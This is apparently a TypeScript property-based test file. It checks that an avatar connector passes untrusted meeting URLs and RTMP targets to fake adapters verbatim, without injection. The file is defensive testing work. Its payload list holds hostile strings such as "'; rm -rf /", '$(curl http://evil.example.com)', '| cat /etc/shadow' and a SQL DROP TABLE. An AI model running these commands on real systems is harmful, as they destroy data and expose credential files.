// Feature: roza-step4-avatar-video, Property 11: Untrusted meeting/stream input passes through verbatim with no injection
//
// Validates: Requirements 8.7
//
// Property 11 drives the Avatar_Connector I/O shell (`createAvatarConnector`)
// with in-memory fake `MeetSession`/`StreamSession` implementations and asserts
// that EVERY externally-supplied meeting URL or RTMP target value — INCLUDING
// command-like / config-like / injection-style strings (`'; rm -rf /'`,
// `$(curl evil)`, `--config=x`, newline-injection, `{"enabled":false}`, very
// long strings, etc.) — is treated as INERT DATA:
//
//   1. PASS-THROUGH VERBATIM — `joinMeet(meetUrl)` hands `meetUrl` to the fake
//      `meet.join` ONLY as its first argument, byte-identical (strict `===`),
//      and `startStream()` hands the configured RTMP url to `stream.start`
//      ONLY as `target.url`, byte-identical. The value is never split, parsed,
//      decoded, or re-encoded on the way to the adapter.
//
//   2. NO INJECTION / NO DERIVED ACTION — the connector performs no
//      configuration change and no command action derived from the content:
//      the `cfg` is structurally identical before and after the call, the
//      untrusted value never bleeds into the credential/key argument, and no
//      adapter method beyond the single intended delegation is invoked (no
//      extra side effects).
//
// No real browser, RTMP endpoint, GPU, or kernel module runs — every external
// edge is an in-memory fake (Req 12.5).

import { describe, it, expect } from 'vitest';
import fc from 'fast-check';

import { createAvatarConnector } from './avatarConnector.js';
import type { AvatarRenderer } from './renderer.js';
import type { VirtualCamera } from './virtualCamera.js';
import type { VirtualMicrophone } from './virtualMicrophone.js';
import type { MeetSession, MeetCredentials } from './meetSession.js';
import type { StreamSession, StreamTarget } from './streamSession.js';
import type { AvatarStream } from './avatarFormat.js';
import type { Logger } from '../../types.js';
import type {
  AvatarOutcome,
  AvatarSession,
  AvatarSessionKind,
  Repository,
} from '../../repository.js';
import type { RozaConfig, AvatarChannelConfig, AvatarPixelFormat } from '../../config.js';

/** Minimum fast-check iterations mandated by the design for every property. */
const NUM_RUNS = 100;

/** Deterministic audit timestamp so the test never reads a real clock. */
const FIXED_NOW = new Date('2024-01-01T00:00:00.000Z');

const pixelFormatArb: fc.Arbitrary<AvatarPixelFormat> = fc.constantFrom(
  'rgba' as const,
  'yuv420p' as const,
  'nv12' as const,
);

/** A non-blank string (so the consent/credentials/target gates pass). */
const nonBlankArb: fc.Arbitrary<string> = fc
  .string({ minLength: 1, maxLength: 40 })
  .filter((s) => s.trim().length > 0);

/**
 * Command-like / config-like / injection-style payloads an attacker might
 * supply as a meeting URL or RTMP target. NONE of these may ever be executed,
 * parsed, or interpreted — they must arrive at the adapter byte-identical.
 */
const INJECTION_PAYLOADS: readonly string[] = [
  "'; rm -rf /",
  '$(curl http://evil.example.com)',
  '`reboot`',
  '&& shutdown now',
  '| cat /etc/shadow',
  '; DROP TABLE avatar_sessions; --',
  '--config=/etc/passwd',
  '--enabled=false',
  '{"enabled":false}',
  '{"meet":{"consent":false}}',
  '{"stream":{"key":"leaked"}}',
  'https://meet.google.com/abc\n--inject=evil',
  '\r\nMEET_CONSENT=false',
  'rtmp://evil/$(whoami)',
  '${process.env.STREAM_KEY}',
  '<script>alert(1)</script>',
  '../'.repeat(64),
  'A'.repeat(10000),
  '\u0000\u0007\u001b[31mmalicious\u001b[0m',
  'meet.google.com/xyz; export AVATAR_ENABLED=false',
];

/**
 * An externally-supplied, UNTRUSTED value: a mix of injection-style payloads,
 * arbitrary strings, and full-unicode strings — all of which must pass through
 * verbatim with no injection effect.
 */
const untrustedValueArb: fc.Arbitrary<string> = fc.oneof(
  fc.constantFrom(...INJECTION_PAYLOADS),
  fc.string(),
  fc.fullUnicodeString(),
  // Injection payloads with arbitrary surrounding noise, to defeat any
  // accidental exact-match special-casing in the connector.
  fc
    .tuple(fc.constantFrom(...INJECTION_PAYLOADS), fc.string({ maxLength: 16 }))
    .map(([p, s]) => `${s}${p}${s}`),
);

// ───────────────────────────────────────────────────────────────────────────
// Fakes — every external edge is in-memory, recording exactly what it received.
// ───────────────────────────────────────────────────────────────────────────

/** A captured `meet.join` delegation (verbatim arguments). */
interface MeetJoinCall {
  meetUrl: string;
  creds: MeetCredentials;
}

/** Mutable call counters for the non-delegation Meet methods (extra-side-effect detection). */
interface MeetCallCounts {
  mute: number;
  leave: number;
}

/** A fake MeetSession recording every method call (to detect extra side effects). */
function makeFakeMeet(): {
  session: MeetSession;
  joinCalls: MeetJoinCall[];
  counts: MeetCallCounts;
} {
  const joinCalls: MeetJoinCall[] = [];
  const counts: MeetCallCounts = { mute: 0, leave: 0 };
  const session: MeetSession = {
    descriptor: { backend: 'playwright', license: 'Apache-2.0' },
    async join(meetUrl: string, creds: MeetCredentials): Promise<void> {
      // Capture the argument verbatim so the test compares the EXACT value the
      // adapter was handed.
      joinCalls.push({ meetUrl, creds: { ...creds } });
    },
    async mute(): Promise<void> {
      counts.mute += 1;
    },
    async leave(): Promise<void> {
      counts.leave += 1;
    },
  };
  return { session, joinCalls, counts };
}

/** A captured `stream.start` delegation (verbatim arguments). */
interface StreamStartCall {
  target: StreamTarget;
  stream: AvatarStream;
}

/** A fake StreamSession recording every method call. */
function makeFakeStream(): {
  session: StreamSession;
  startCalls: StreamStartCall[];
  counts: { stop: number };
} {
  const startCalls: StreamStartCall[] = [];
  const counts = { stop: 0 };
  const session: StreamSession = {
    descriptor: { backend: 'ffmpeg', license: 'GPL-2.0' },
    async start(target: StreamTarget, stream: AvatarStream): Promise<void> {
      startCalls.push({ target: { ...target }, stream });
    },
    async stop(): Promise<void> {
      counts.stop += 1;
    },
  };
  return { session, startCalls, counts };
}

/** A recorded `avatar_sessions` audit row. */
interface AuditRecord {
  id: string;
  kind: AvatarSessionKind;
  target: string | null;
  closed: { outcome: AvatarOutcome; at: string } | null;
}

/** Build a fake `Repository` recording only the avatar-session audit calls. */
function makeFakeRepo(): { repo: Repository; records: AuditRecord[] } {
  const records: AuditRecord[] = [];
  let counter = 0;
  const repo = {
    startAvatarSession(kind: AvatarSessionKind, target?: string | null): AvatarSession {
      const id = `audit-${counter++}`;
      records.push({ id, kind, target: target ?? null, closed: null });
      return {
        id,
        kind,
        target: target ?? null,
        outcome: 'in_progress',
        started_at: FIXED_NOW.toISOString(),
        ended_at: null,
      };
    },
    endAvatarSession(id: string, outcome: AvatarOutcome, at: string): void {
      const rec = records.find((r) => r.id === id);
      if (rec) {
        rec.closed = { outcome, at };
      }
    },
  } as unknown as Repository;
  return { repo, records };
}

/** A no-op spy logger (logging is verified by other properties). */
function makeSpyLogger(): Logger {
  return {
    info(): void {},
    error(): void {},
  };
}

/** Inert renderer/camera/microphone — the Meet/stream paths never touch them. */
const inertRenderer: AvatarRenderer = {
  descriptor: { engine: 'fake', license: 'MIT' },
  async render() {
    throw new Error('renderer not exercised by injection property');
  },
};
const inertCamera: VirtualCamera = {
  descriptor: { device: 'fake-cam', backend: 'fake', license: 'MIT' },
  async open() {},
  async write() {},
  async close() {},
};
const inertMicrophone: VirtualMicrophone = {
  descriptor: { device: 'fake-mic', backend: 'fake', license: 'MIT' },
  async open() {},
  async write() {},
  async close() {},
};

/** Generated, fully-enabled avatar config inputs (meet + stream operative). */
interface EnabledAvatarInputs {
  width: number;
  height: number;
  fps: number;
  pixelFormat: AvatarPixelFormat;
  account: string;
  password: string;
  streamKey: string;
}

const enabledAvatarArb: fc.Arbitrary<EnabledAvatarInputs> = fc.record({
  width: fc.integer({ min: 1, max: 1920 }),
  height: fc.integer({ min: 1, max: 1080 }),
  fps: fc.integer({ min: 1, max: 60 }),
  pixelFormat: pixelFormatArb,
  account: nonBlankArb,
  password: nonBlankArb,
  streamKey: nonBlankArb,
});

/** Build an enabled `AvatarChannelConfig` with the supplied stream URL. */
function makeAvatarConfig(a: EnabledAvatarInputs, streamUrl: string): AvatarChannelConfig {
  return {
    enabled: true,
    video: { width: a.width, height: a.height, fps: a.fps, pixelFormat: a.pixelFormat },
    latency: { renderMs: 4000 },
    renderer: { endpoint: 'http://renderer.local', engine: 'fake' },
    devices: { camera: 'cam0', microphone: 'mic0' },
    meet: { enabled: true, consent: true, account: a.account, password: a.password },
    stream: { enabled: true, url: streamUrl, key: a.streamKey },
  };
}

/** Build a fully-resolved RozaConfig with the supplied enabled avatar config. */
function makeConfig(avatar: AvatarChannelConfig): RozaConfig {
  return {
    rozaPrivateKey: 'test-private-key',
    openRouterApiKey: 'test-api-key',
    openRouterModel: 'openai/gpt-4o-mini',
    dataDir: '/tmp/roza-test',
    timezone: 'Africa/Kinshasa',
    activeWindow: { startMinutes: 420, endMinutes: 1320 },
    keyVersion: 'v1',
    telegram: { enabled: false, botToken: '', allowlist: [] },
    mail: {
      enabled: false,
      imap: { host: '', port: 0, user: '', password: '' },
      smtp: { host: '', port: 0, user: '', password: '' },
      allowlist: [],
    },
    voice: {
      enabled: false,
      sip: { host: '', port: 0, user: '', password: '', realm: '' },
      allowlist: [],
      defaultAccess: 'reject',
      quietHoursInbound: 'take_message',
      tts: { engine: 'piper', voice: 'en_US-amy-medium', model: 'en_US-amy-medium' },
      stt: { engine: 'whisper.cpp', model: 'ggml-base.en' },
      maxReplyChars: 1000,
      latency: { ttsMs: 5000, sttMs: 5000, endToEndMs: 8000, ringTimeoutMs: 30000 },
    },
    avatar,
    x: {
      enabled: false,
      credentials: { username: '', password: '' },
      storageStatePath: '',
      autonomyIntervalMinutes: 60,
      rateLimit: { dailyPostLimit: 10, actionSpacingMs: 600000 },
      maxTopics: 3,
      maxPostChars: 280,
      dryRun: false,
    },
  };
}

describe('Untrusted meeting/stream input passes through verbatim with no injection (Property 11)', () => {
  // Feature: roza-step4-avatar-video, Property 11: Untrusted meeting/stream input passes through verbatim with no injection
  // Validates: Requirements 8.7
  it('joinMeet hands ANY untrusted meetUrl (incl. injection payloads) to meet.join verbatim and as data only', async () => {
    await fc.assert(
      fc.asyncProperty(
        enabledAvatarArb,
        untrustedValueArb,
        async (avatarInputs, meetUrl) => {
          const avatar = makeAvatarConfig(avatarInputs, 'rtmp://ingest.local/app');
          const cfg = makeConfig(avatar);
          // Structural snapshot of cfg taken BEFORE the call — a faithful deep
          // copy so a post-call comparison detects any derived mutation.
          const cfgSnapshot = structuredClone(cfg);

          const fakeMeet = makeFakeMeet();
          const { repo, records } = makeFakeRepo();

          const connector = createAvatarConnector({
            renderer: inertRenderer,
            camera: inertCamera,
            microphone: inertMicrophone,
            meet: fakeMeet.session,
            cfg,
            avatarImage: () => new Uint8Array(0),
            now: () => FIXED_NOW,
            logger: makeSpyLogger(),
            audioOnlyDeliver: async () => {},
            repo,
          });

          const result = await connector.joinMeet(meetUrl);
          expect(result.ok).toBe(true);

          // PASS-THROUGH VERBATIM — meetUrl reaches meet.join as the FIRST
          // argument, byte-identical (strict ===), never split/parsed/re-encoded.
          expect(fakeMeet.joinCalls).toHaveLength(1);
          const call = fakeMeet.joinCalls[0]!;
          expect(call.meetUrl).toBe(meetUrl);
          expect(call.meetUrl.length).toBe(meetUrl.length);

          // NO INJECTION INTO CREDENTIALS — the untrusted value only ever
          // travels as the URL argument; the credentials come from cfg, never
          // derived from or contaminated by the content.
          expect(call.creds).toEqual({
            account: avatar.meet.account,
            password: avatar.meet.password,
          });

          // NO EXTRA SIDE EFFECTS — exactly one delegation, no mute/leave action
          // triggered by the content (no command derived from the payload).
          expect(fakeMeet.counts.mute).toBe(0);
          expect(fakeMeet.counts.leave).toBe(0);

          // NO CONFIG CHANGE — config-like payloads (`{"enabled":false}`,
          // `--enabled=false`, `MEET_CONSENT=false`) never alter cfg.
          expect(cfg).toEqual(cfgSnapshot);

          // The audit row records the URL as inert `target` data only (never a
          // credential), and is the single meet row opened for this call.
          const meetAudits = records.filter((r) => r.kind === 'meet');
          expect(meetAudits).toHaveLength(1);
          expect(meetAudits[0]!.target).toBe(meetUrl);
        },
      ),
      { numRuns: NUM_RUNS },
    );
  });

  // Feature: roza-step4-avatar-video, Property 11: Untrusted meeting/stream input passes through verbatim with no injection
  // Validates: Requirements 8.7
  it('startStream hands ANY untrusted RTMP url (incl. injection payloads) to stream.start verbatim and as data only', async () => {
    await fc.assert(
      fc.asyncProperty(
        enabledAvatarArb,
        untrustedValueArb,
        async (avatarInputs, streamUrl) => {
          const avatar = makeAvatarConfig(avatarInputs, streamUrl);
          const cfg = makeConfig(avatar);
          const cfgSnapshot = structuredClone(cfg);

          const fakeStream = makeFakeStream();
          const { repo, records } = makeFakeRepo();

          const connector = createAvatarConnector({
            renderer: inertRenderer,
            camera: inertCamera,
            microphone: inertMicrophone,
            stream: fakeStream.session,
            cfg,
            avatarImage: () => new Uint8Array(0),
            now: () => FIXED_NOW,
            logger: makeSpyLogger(),
            audioOnlyDeliver: async () => {},
            repo,
          });

          const result = await connector.startStream();
          expect(result.ok).toBe(true);

          // PASS-THROUGH VERBATIM — the configured RTMP url reaches stream.start
          // ONLY as target.url, byte-identical (strict ===).
          expect(fakeStream.startCalls).toHaveLength(1);
          const call = fakeStream.startCalls[0]!;
          expect(call.target.url).toBe(streamUrl);
          expect(call.target.url.length).toBe(streamUrl.length);

          // The key is the configured Stream_Key, never derived from the url.
          expect(call.target.key).toBe(avatar.stream.key);

          // NO EXTRA SIDE EFFECTS — exactly one delegation, no stop triggered by
          // the content; the untrusted url is never executed as a command.
          expect(fakeStream.counts.stop).toBe(0);

          // NO CONFIG CHANGE — config-like payloads never alter cfg.
          expect(cfg).toEqual(cfgSnapshot);

          // The audit row records the ingest url as inert `target` data only
          // (never the Stream_Key).
          const streamAudits = records.filter((r) => r.kind === 'stream');
          expect(streamAudits).toHaveLength(1);
          expect(streamAudits[0]!.target).toBe(streamUrl);
        },
      ),
      { numRuns: NUM_RUNS },
    );
  });
});
